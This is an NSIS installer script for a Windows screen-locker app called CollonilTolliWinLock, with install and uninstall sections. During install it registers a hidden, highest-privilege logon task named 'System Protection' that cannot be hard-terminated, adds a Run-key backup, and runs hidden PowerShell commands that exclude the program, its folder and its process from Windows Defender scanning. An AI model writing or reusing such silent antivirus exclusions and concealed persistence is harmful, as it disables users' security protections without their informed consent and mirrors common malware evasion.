; CollonilTolliWinLock NSIS Installer Script
!define APPNAME "CollonilTolliWinLock"
!define COMPANYNAME "CollonilTolliWinLock"
!define DESCRIPTION "Windows Screen Locker Application"
!define VERSIONMAJOR 1
!define VERSIONMINOR 0
!define VERSIONBUILD 0
!define HELPURL "https://github.com/CollonilTolliWinLock/CollonilTolliWinLock"
!define UPDATEURL "https://github.com/CollonilTolliWinLock/CollonilTolliWinLock"
!define ABOUTURL "https://github.com/CollonilTolliWinLock/CollonilTolliWinLock"
!define INSTALLSIZE 500000

RequestExecutionLevel admin
InstallDir "$PROGRAMFILES\${APPNAME}"
LicenseData "LICENSE.txt"
Name "${APPNAME}"
OutFile "CollonilTolliWinLock-Setup.exe"

!include LogicLib.nsh

Page license
Page directory
Page instfiles

!macro VerifyUserIsAdmin
UserInfo::GetAccountType
pop $0
${If} $0 != "admin"
    messageBox mb_iconstop "Administrator rights required!"
    setErrorLevel 740
    quit
${EndIf}
!macroend

Function .onInit
    setShellVarContext all
    !insertmacro VerifyUserIsAdmin
FunctionEnd

Section "install"
    SetOutPath $INSTDIR
    
    ; Copy all files from dist folder
    File /r "dist\CollonilTolliWinLock-win32-x64\*"
    
    ; Create uninstaller
    WriteUninstaller "$INSTDIR\uninstall.exe"
    
    ; Add to Windows Startup using Task Scheduler for faster boot
    DetailPrint "Creating high-priority startup task..."
    
    ; Create XML task definition for immediate startup
    FileOpen $0 "$TEMP\CollonilTolliWinLock_task.xml" w
    FileWrite $0 '<?xml version="1.0" encoding="UTF-16"?>$\r$\n'
    FileWrite $0 '<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">$\r$\n'
    FileWrite $0 '  <RegistrationInfo>$\r$\n'
    FileWrite $0 '    <Description>CollonilTolliWinLock System Protection</Description>$\r$\n'
    FileWrite $0 '  </RegistrationInfo>$\r$\n'
    FileWrite $0 '  <Triggers>$\r$\n'
    FileWrite $0 '    <LogonTrigger>$\r$\n'
    FileWrite $0 '      <Enabled>true</Enabled>$\r$\n'
    FileWrite $0 '      <Delay>PT0S</Delay>$\r$\n'
    FileWrite $0 '    </LogonTrigger>$\r$\n'
    FileWrite $0 '  </Triggers>$\r$\n'
    FileWrite $0 '  <Principals>$\r$\n'
    FileWrite $0 '    <Principal id="Author">$\r$\n'
    FileWrite $0 '      <LogonType>InteractiveToken</LogonType>$\r$\n'
    FileWrite $0 '      <RunLevel>HighestAvailable</RunLevel>$\r$\n'
    FileWrite $0 '    </Principal>$\r$\n'
    FileWrite $0 '  </Principals>$\r$\n'
    FileWrite $0 '  <Settings>$\r$\n'
    FileWrite $0 '    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>$\r$\n'
    FileWrite $0 '    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>$\r$\n'
    FileWrite $0 '    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>$\r$\n'
    FileWrite $0 '    <AllowHardTerminate>false</AllowHardTerminate>$\r$\n'
    FileWrite $0 '    <StartWhenAvailable>true</StartWhenAvailable>$\r$\n'
    FileWrite $0 '    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>$\r$\n'
    FileWrite $0 '    <IdleSettings>$\r$\n'
    FileWrite $0 '      <StopOnIdleEnd>false</StopOnIdleEnd>$\r$\n'
    FileWrite $0 '      <RestartOnIdle>false</RestartOnIdle>$\r$\n'
    FileWrite $0 '    </IdleSettings>$\r$\n'
    FileWrite $0 '    <AllowStartOnDemand>true</AllowStartOnDemand>$\r$\n'
    FileWrite $0 '    <Enabled>true</Enabled>$\r$\n'
    FileWrite $0 '    <Hidden>true</Hidden>$\r$\n'
    FileWrite $0 '    <RunOnlyIfIdle>false</RunOnlyIfIdle>$\r$\n'
    FileWrite $0 '    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>$\r$\n'
    FileWrite $0 '    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>$\r$\n'
    FileWrite $0 '    <WakeToRun>false</WakeToRun>$\r$\n'
    FileWrite $0 '    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>$\r$\n'
    FileWrite $0 '    <Priority>4</Priority>$\r$\n'
    FileWrite $0 '  </Settings>$\r$\n'
    FileWrite $0 '  <Actions Context="Author">$\r$\n'
    FileWrite $0 '    <Exec>$\r$\n'
    FileWrite $0 '      <Command>$INSTDIR\CollonilTolliWinLock.exe</Command>$\r$\n'
    FileWrite $0 '      <WorkingDirectory>$INSTDIR</WorkingDirectory>$\r$\n'
    FileWrite $0 '    </Exec>$\r$\n'
    FileWrite $0 '  </Actions>$\r$\n'
    FileWrite $0 '</Task>$\r$\n'
    FileClose $0
    
    ; Import task with highest priority and immediate execution
    ExecWait 'schtasks.exe /Create /TN "CollonilTolliWinLockSystemProtection" /XML "$TEMP\CollonilTolliWinLock_task.xml" /F' $1
    Delete "$TEMP\CollonilTolliWinLock_task.xml"
    
    ; Also add registry entry as backup method
    WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "CollonilTolliWinLock" "$INSTDIR\CollonilTolliWinLock.exe"
    
    ; Add Windows Defender exclusions
    DetailPrint "Adding Windows Defender exclusions..."
    ExecWait 'powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath \"$INSTDIR\CollonilTolliWinLock.exe\" -ErrorAction SilentlyContinue"'
    ExecWait 'powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath \"$INSTDIR\" -ErrorAction SilentlyContinue"'
    ExecWait 'powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionProcess \"CollonilTolliWinLock.exe\" -ErrorAction SilentlyContinue"'
    
    ; Create desktop shortcut
    CreateShortCut "$DESKTOP\${APPNAME}.lnk" "$INSTDIR\CollonilTolliWinLock.exe" "" "$INSTDIR\CollonilTolliWinLock.exe" 0
    
    ; Create start menu shortcut
    CreateDirectory "$SMPROGRAMS\${APPNAME}"
    CreateShortCut "$SMPROGRAMS\${APPNAME}\${APPNAME}.lnk" "$INSTDIR\CollonilTolliWinLock.exe" "" "$INSTDIR\CollonilTolliWinLock.exe" 0
    CreateShortCut "$SMPROGRAMS\${APPNAME}\Uninstall.lnk" "$INSTDIR\uninstall.exe" "" "$INSTDIR\uninstall.exe" 0
    
    ; Registry information for add/remove programs
    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "DisplayName" "${APPNAME} - ${DESCRIPTION}"
    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "UninstallString" "$INSTDIR\uninstall.exe"
    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "QuietUninstallString" "$INSTDIR\uninstall.exe /S"
    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "InstallLocation" "$INSTDIR"
    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "DisplayIcon" "$INSTDIR\CollonilTolliWinLock.exe"
    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "Publisher" "${COMPANYNAME}"
    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "HelpLink" "${HELPURL}"
    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "URLUpdateInfo" "${UPDATEURL}"
    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "URLInfoAbout" "${ABOUTURL}"
    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "DisplayVersion" "${VERSIONMAJOR}.${VERSIONMINOR}.${VERSIONBUILD}"
    WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "VersionMajor" ${VERSIONMAJOR}
    WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "VersionMinor" ${VERSIONMINOR}
    WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "NoModify" 1
    WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "NoRepair" 1
    WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "EstimatedSize" ${INSTALLSIZE}
SectionEnd

; Uninstaller
Function un.onInit
    SetShellVarContext all
    
    MessageBox MB_OKCANCEL "Permanently remove ${APPNAME} and all of its components?" IDOK next
        Abort
    next:
    !insertmacro VerifyUserIsAdmin
FunctionEnd

Section "uninstall"
    ; Remove Task Scheduler entry
    ExecWait 'schtasks.exe /Delete /TN "CollonilTolliWinLockSystemProtection" /F'
    
    ; Remove from Windows Startup registry
    DeleteRegValue HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "CollonilTolliWinLock"
    
    ; Remove Windows Defender exclusions
    DetailPrint "Removing Windows Defender exclusions..."
    ExecWait 'powershell.exe -WindowStyle Hidden -Command "Remove-MpPreference -ExclusionPath \"$INSTDIR\CollonilTolliWinLock.exe\" -ErrorAction SilentlyContinue"'
    ExecWait 'powershell.exe -WindowStyle Hidden -Command "Remove-MpPreference -ExclusionPath \"$INSTDIR\" -ErrorAction SilentlyContinue"'
    ExecWait 'powershell.exe -WindowStyle Hidden -Command "Remove-MpPreference -ExclusionProcess \"CollonilTolliWinLock.exe\" -ErrorAction SilentlyContinue"'
    
    ; Remove Start Menu launcher
    Delete "$SMPROGRAMS\${APPNAME}\${APPNAME}.lnk"
    Delete "$SMPROGRAMS\${APPNAME}\Uninstall.lnk"
    RmDir "$SMPROGRAMS\${APPNAME}"
    
    ; Remove desktop shortcut
    Delete "$DESKTOP\${APPNAME}.lnk"
    
    ; Remove files
    RmDir /r "$INSTDIR"
    
    ; Remove uninstaller information from the registry
    DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}"
SectionEnd